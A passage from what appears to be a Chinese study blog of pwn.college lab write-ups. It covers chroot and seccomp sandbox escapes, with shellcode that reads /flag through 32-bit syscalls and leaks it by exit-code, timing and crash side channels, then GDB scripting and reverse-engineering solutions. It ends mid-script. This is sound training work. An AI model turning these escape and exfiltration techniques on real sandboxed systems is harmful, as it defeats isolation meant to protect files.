<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">chdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">80</span>).<br>chroot (<span class="hljs-keyword">number</span> <span class="hljs-number">161</span>).<br><span class="hljs-built_in">mkdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">83</span>).<br><span class="hljs-keyword">open</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">2</span>).<br><span class="hljs-keyword">read</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">0</span>).<br><span class="hljs-keyword">write</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">1</span>).<br>sendfile (<span class="hljs-keyword">number</span> <span class="hljs-number">40</span>).<br></code></pre></div></td></tr></table></figure>

<p>使用再次chroot:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.mkdir(<span class="hljs-string">&quot;/temp&quot;</span>, <span class="hljs-number">0o777</span>)<br>shellcode+= shellcraft.amd64.chroot(<span class="hljs-string">&quot;/temp&quot;</span>)             <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../../flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure>

<h3 id="8-openat-read-write-send"><a href="#8-openat-read-write-send" class="headerlink" title="8.openat read write send"></a>8.openat read write send</h3><p>感觉没什么特别的. 参数已经不限制输入flag了. 直接使用第三题的东西.</p>
<h3 id="9-变成32位"><a href="#9-变成32位" class="headerlink" title="9.变成32位"></a>9.变成32位</h3><p>syscall no: 3,4,5,6: <strong>close, stat, fstat, lstat.</strong> ???????????</p>
<p>哦对, 程序里的seccomp是通过SCMP_SYS() macro来add rule的, 然后又把arch设置成x86_32, 这样的话就是32位的read write open close这四个系统调用了. 而且没有chroot.</p>
<p>尝试使用pwntools遇到各种各样的问题.</p>
<ul>
<li>64和32代码是怎么切换的? int 0x80 and syscall吗?</li>
<li>int 0x80在64位模式下汇编, push最多DWORD. 不然operand mismatch.</li>
<li>字符串的地址只能使用汇编中的label, 栈上的地址仍然是64位的, 可能是因为过长导致open不能使用.</li>
<li>64位汇编肯定就不能用SYS_read这种了, 只能改成数字. </li>
</ul>
<p>精简如下(也没多精简):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">/* open(file=&#x27;/flag&#x27;, oflag=&#x27;O_RDWR&#x27;, mode=0) */<br>/* push b&#x27;/flag\x00&#x27; */<br>lea ebx, [rip+flag]<br>mov ecx, 0x2<br>xor edx, edx<br>/* call open() */<br>mov eax, 5<br>int 0x80<br>/* read(fd=&#x27;eax&#x27;, buf=0x1337100, nbytes=0x99) */<br>mov ebx, eax<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call read() */                               <br>push 3	/* 3 */<br>pop rax<br>int 0x80<br>/* write(fd=1, buf=0x1337100, n=0x32) */<br>mov ebx, 0x1<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call write() */<br>mov eax, 4<br>int 0x80<br><br>flag:<br>    .ascii &quot;/flag&quot;<br>    .byte 0 #加不加没有区别, map上去的地址空间都是零<br></code></pre></div></td></tr></table></figure>

<h3 id="10-side-channel-communication"><a href="#10-side-channel-communication" class="headerlink" title="10.side channel communication"></a>10.side channel communication</h3><blockquote>
<p>都没有chroot了. 这题使用exit每次返回一字节.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)                                   <br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>

<h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote>
<p>这下子真的是bitwise的收集数据了</p>
</blockquote>
<p>遇到的几个问题:</p>
<ul>
<li>偶然会发生broken tube, 不知原因.</li>
<li>可以用字符串的format函数. </li>
<li>在pwn.college机子上timespec结构体两个成员都是<strong>八字节(包括long)</strong> </li>
<li>被网上抄来的32位程序nasm坑了一把, 现在是64位gas, 基本全改了……….</li>
<li>setnz是思维导图里看到突然想起来能用的. 以前整得笔记还不错.</li>
<li>直接使用label地址会有重定位条目, 必须使用rip来加上标签的偏移来在运行时确定准确的地址.</li>
<li>加载地址请用lea……line 15卡了十几分钟…..</li>
<li>视频中演示了time命令, 计算程序运行时间.</li>
<li>也可以直接写在栈上, 不用在汇编里写上这么一个数据结构.</li>
<li>如果把时间范围调大一点也能用时间来表示ascii码值, 也就是一次一字节. 应该更快.</li>
<li>视频使用了一个pwn.log.progress和process参数level, 这样子就不会有一堆打开关闭命令了.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>bck1 = <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100\n&#x27;</span>+shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)+<span class="hljs-string">&#x27;xor rcx, rcx\n&#x27;</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    setnz cl</span><br><span class="hljs-string">    sal ecx, 4</span><br><span class="hljs-string">    mov [rip+tv_usec+3], cl</span><br><span class="hljs-string">    mov rax, 35</span><br><span class="hljs-string">    lea rdi, [rip+timeval]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //经典非法指令,至少让我知道shellcode执行正常</span><br><span class="hljs-string">    .ascii &quot;\x0f\x04&quot; </span><br><span class="hljs-string">    timeval:</span><br><span class="hljs-string">    tv_sec:  .8byte 0</span><br><span class="hljs-string">    tv_usec: .8byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    char = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc = bck1 <span class="hljs-comment">#这个就是对read的一个封装</span><br>        <span class="hljs-comment">#下面这个是取出一字节, 然后测试第j位是否为1</span><br>        sc += <span class="hljs-string">&#x27;mov cl, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\ntest cl,&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">1</span>&lt;&lt;j)+<span class="hljs-string">&#x27;\n&#x27;</span><br>        sc += bck2	<br><span class="hljs-comment">#上面这个是nanosleep的调用封装,秒数由j位移位赋值到timespec结构体中第二个成员的第四个字节</span><br><span class="hljs-comment">#(从最低位开始, 因为是小端法存储),结果是268,435,456(1 0000|00000000|00000000|00000000)ns</span><br><span class="hljs-comment">#无sleep大概是0.05s,所以分界点为0.2s</span><br>        payload = asm(sc)<br>        start = time.time()<br>        p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>        p.sendline(payload)<br>        p.wait()<br>        end = time.time()<br>        elapse = end - start<br>        <span class="hljs-keyword">if</span> elapse &gt; <span class="hljs-number">0.2</span>:<br>            char |= <span class="hljs-number">1</span>&lt;&lt;j<br>    <span class="hljs-comment">#end for bits loop</span><br>    ans += <span class="hljs-built_in">chr</span>(char)<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>

<h3 id="12-only-read"><a href="#12-only-read" class="headerlink" title="12.only read"></a>12.only read</h3><p>这次换成crash code就行了. <code>-4 </code>is <code>SIGILL</code>, <code>-11</code> is <code>SIGSEGV</code> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#一点小改动</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">jnz isZero</span><br><span class="hljs-string">.ascii &quot;\x0f\x04&quot;</span><br><span class="hljs-string">isZero: .byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> p.poll(<span class="hljs-number">1</span>) == -<span class="hljs-number">4</span>:<br>    char |= mask<br></code></pre></div></td></tr></table></figure>

<h3 id="13-怎么是socket"><a href="#13-怎么是socket" class="headerlink" title="13.怎么是socket??"></a>13.怎么是socket??</h3><blockquote>
<p>use socketpair to the local communication </p>
<p>感觉没有任何限制啊, 就是构造一点父子进程间特有的命令.</p>
</blockquote>
<p>开始gdb refresher!!!!!</p>
<h1 id="module-6"><a href="#module-6" class="headerlink" title="module 6"></a>module 6</h1><p>GDB时间!</p>
<ul>
<li>info有好多东西. 看到一个<code>i proc m(appings)</code>, 不就是我上次用的<code>! cat /proc/pid/maps</code>么.</li>
<li> 一份超好看的<a target="_blank" rel="noopener" href="https://www.cs.umd.edu/class/spring2015/cmsc414/downloads/gdb-refcard.pdf">cheatsheet</a>!</li>
<li>pwndbg的<a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md">features</a> </li>
<li>神奇的教程网站, 视频是文字. <a target="_blank" rel="noopener" href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/">link</a> </li>
<li>三种gdb插件–gef(<a target="_blank" rel="noopener" href="https://demo.gef.blah.cat/">demo网站</a>|<a target="_blank" rel="noopener" href="https://gef.readthedocs.io/en/master/">doc</a>), 其他两个装好了. 还是peda安装简单, 还能整到pwncollege上. 再用一个插件我会混的….</li>
</ul>
<p>“Auto-loading safe path” section in the GDB manual.</p>
<p>前几题都没什么特别的, 就是一个refresher.</p>
<p>命令行选项: <code>/challenge/e* -x gdbscrip -q</code> </p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>居然要重复四次, 直接修改推导变量. 而且没有运行前加上断点会出错….原因待查.</p>
<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>开始编写gdb脚本. 没有尝试过的东西, 马上开学.</p>
<p>查看gdb manual, <code>5.1.7 Breakpoint Command Lists</code>有提到一种特别的写法:</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">commands [list.<span class="hljs-string">..</span>]<br><span class="hljs-string">...</span> command-list <span class="hljs-string">...</span><br>end<br></code></pre></div></td></tr></table></figure>

<p>Any other command after a command that resumes execution will be ignored. </p>
<p>Can use <code>silent</code> to disable the printing of usual message when stopping at certain breakpoint. Usefull command for contolled output in <code>23.1.4 Commands for Controlled Output</code>, usually <code>echo, output, and printf</code> </p>
<p>You can also use breakpoint commands to compensate for one bug and test the other!</p>
<p><strong>e.g.</strong> </p>
<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">break</span> foo <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span><br>commands<br>silent<br>printf <span class="hljs-string">&quot;x is %d\n&quot;</span>,x<br>cont<br>end<br></code></pre></div></td></tr></table></figure>

<p>好家伙, 每次地址都会变, 得换成相对地址. printf *($rbp-0x18)直接失败, 报attemp to dereferecing a generic pointer. 要想dereference指针得确定指针的类型, </p>
<p>先设断点然后再c(ontinue).</p>
<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">r                           <br>b *main+<span class="hljs-number">709</span><br>commands<br>    silent<br>    <span class="hljs-keyword">x</span>/gx $rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><br>    set *(int*)($rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>)<span class="hljs-operator">=</span><span class="hljs-number">7</span><br>    <span class="hljs-keyword">c</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">c</span><br></code></pre></div></td></tr></table></figure>

<p>真正自己写起来问题怎么这么多……</p>
<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><ul>
<li><p>全自动scrip. 在手册中的<code>23.1.3 Command Files</code>有介绍一些flow control command. 然后<code>5.1.3 Setting Catchpoints</code>也挺重要.</p>
</li>
<li><p>This time, try to write a script that doesn’t require you to ever talk to the program, and instead automatically solves each challenge by correctly <strong>modifying registers / memory.</strong> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.mengyibai.com/p/gdb-print-variables/">GDB: Printing Variables to File</a>, 不太好用, 毕竟是logging文件.</p>
</li>
<li><p>使用<code>printf</code>命令来写raw bytes到文件中.</p>
</li>
<li><p><code>commands</code>命令可以为断点添加命令.</p>
</li>
<li><p><code>ddb</code> – interactive kernel debugger</p>
</li>
</ul>
<p>如果要全自动, 我想到的思路是在read /dev/urandom的时候改成从stdin获取, 然后再gdb中使用<code>r &lt; tmp</code>来重定向. 后面的scanf也是从stdin获取, 这样的话就好办了. 为了测试conditionally perform gdb commands, 就不更改循环变量了.</p>
<p>历经挫折: </p>
<ul>
<li><del>把文件作为输入而且要多次输入, 每次文件指针都会向后移动的…..所以还是改变内存吧……</del>事实证明没有问题, 不过如果只是简单地&gt;=3会导致flag无法打开. 所以加上<code>4&lt;tmp</code>, if条件换成<code>if $rdi &gt;= 3 &amp;&amp; $rdi != 0x44</code>即可. </li>
<li>这个程序每次都会重新打开/dev/uramdom, 或许是因为新的随机数要重新打开???这样文件指针会大于等于3……</li>
<li>catch syscall会在syscall之前和之后调用, 所以设置好if语句就行…. (calls to and returns from system calls will be caught.)</li>
<li>还把==写成=, 绝</li>
<li>还发现了一个, 第六行按理来说已经跳到别的函数了, 毕竟read也只是glibc的封装, 但没注意到的是<code>__GI___libc_read()</code>这个函数根本没有<code>push rbp</code>,  <strong>所以当前栈帧没有变化</strong>.</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3 &amp;&amp; $rdi != 0x44)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure>

<p>一个level能挣这么多东西出来…….</p>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>直接一个<code>call (void*)win()</code>就结束了….</p>
<h1 id="module-7"><a href="#module-7" class="headerlink" title="module 7"></a>module 7</h1><ul>
<li>forword engineering vs. reverse engineering</li>
<li><code>cpp du strip strings</code> commands.</li>
<li>the most often we do is reversing the main modules.</li>
<li><code>fomit-frame-pointer</code> </li>
<li><a target="_blank" rel="noopener" href="https://cloud.binary.ninja/u/yogdzewa">cloud ninja</a> 用这个或者直接IDA就行. 都有IDA pro了其他的就随便试试.反正视频里是不可能说用盗版的:laughing: </li>
<li>把另一个checksec链接成了secheck, 功能似乎更多一点.</li>
<li>Open source:<ul>
<li><strong>angr management:</strong> an academic binary analysis framework! (<a target="_blank" rel="noopener" href="https://github.com/angr/angr-management/releases">github</a>) </li>
<li><strong>ghidra:</strong> a reversing tool created by the National Security Agency (<a target="_blank" rel="noopener" href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>) </li>
<li><strong>cutter:</strong> a reversing tool created by the radare2 open source project (<a target="_blank" rel="noopener" href="https://cutter.re/">https://cutter.re/</a>) </li>
</ul>
</li>
<li>dynamic analysis: <ul>
<li>ltrace and strace </li>
<li>gdb<ul>
<li>context可以直接用display命令在每次停下来的时候模拟.</li>
</ul>
</li>
<li>Timeless Debugging<ul>
<li><strong>gdb</strong> has built-in record-replay functionality (<a target="_blank" rel="noopener" href="https://sourceware.org/gdb/current/onlinedocs/gdb/Process-Record-and-Replay.html">doc</a>)</li>
<li><strong>rr</strong> is a highly-performant record-replay engine (<a target="_blank" rel="noopener" href="https://github.com/mozilla/rr">github</a>) <a target="_blank" rel="noopener" href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li>
<li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a target="_blank" rel="noopener" href="https://qira.me/">https://qira.me/</a>) </li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="level1-0-2-1"><a href="#level1-0-2-1" class="headerlink" title="level1.0-2.1"></a>level1.0-2.1</h3><p>没有什么特别, 但是2.1这个字符换位置的汇编值得注意:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movzx   eax, byte ptr [rbp+buf]<br>mov     byte ptr [rbp+var_10], al<br>movzx   eax, byte ptr [rbp+buf+1]<br>mov     byte ptr [rbp+var_10+1], al<br>movzx   eax, byte ptr [rbp+var_10+1]<br>mov     byte ptr [rbp+buf], al<br>movzx   eax, byte ptr [rbp+var_10]<br>mov     byte ptr [rbp+buf+1], al<br></code></pre></div></td></tr></table></figure>

<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>合着每关还有提示这关用了什么……</p>
<p>level3是reverse mangler.</p>
<h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h3><ul>
<li>IDA的汇编语法是使用的MASM(Microsoft Macro Assembler)的. <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-170">这里</a>是一些directive. </li>
<li>IDA使用的high-level IL是IDC, 一个C-like language. 像什么<code>LOBYTE</code>在手册中有</li>
<li>一个<code>char buf[6]</code>被识别成了<code>int buf + int16_t v6</code>, 改一下buf的定义就成.</li>
<li>看了看IDA的一些操作.</li>
</ul>
<p>由于<code>biltw</code>是按照字母顺序排列, 所以一通操作之后没有变化.</p>
<h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h3><blockquote>
<p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb2</code> </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">0xFA</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xF1</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x^<span class="hljs-number">0x98</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>])<br><br>[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>]<br></code></pre></div></td></tr></table></figure>

<p>好像简单过头了…</p>
<h3 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h3><blockquote>
<p>reverse + sort + xor</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8f 8e 8e 8e 8c 82 81 87 86 84 9f 9e 9e 9e 93&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br>list1 = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)^<span class="hljs-number">0xeb</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br>list1.reverse()<br>res = <span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list1])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></div></td></tr></table></figure>

<p>属于是python的练习使用</p>
<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><blockquote>
<p>真特么复杂….还有<strong>不可见字符</strong>只能整成byte写到文件里.</p>
<p>好像挺简单, 但是又有点难(?</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ff ff fe fc fb fb fb f7 f6 f6 f1 e7 e6 e1 e1 3c 3a 3a 38 37 32 32 20 2c 25 22 21 32 20&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>]<br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#print(len(list))</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">list</span>[i] ^= <span class="hljs-number">0x95</span><br>    <span class="hljs-built_in">list</span>[i+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0x56</span><br><span class="hljs-built_in">list</span>[<span class="hljs-number">28</span>] ^= <span class="hljs-number">0x95</span> <span class="hljs-comment">#奇数个.....</span><br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>byte = <span class="hljs-string">b&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]) <span class="hljs-comment">#什么需求直接谷歌比看文档快多了, 特别是这种简单语法......</span><br><span class="hljs-built_in">print</span>(byte)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/root/Desktop/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> 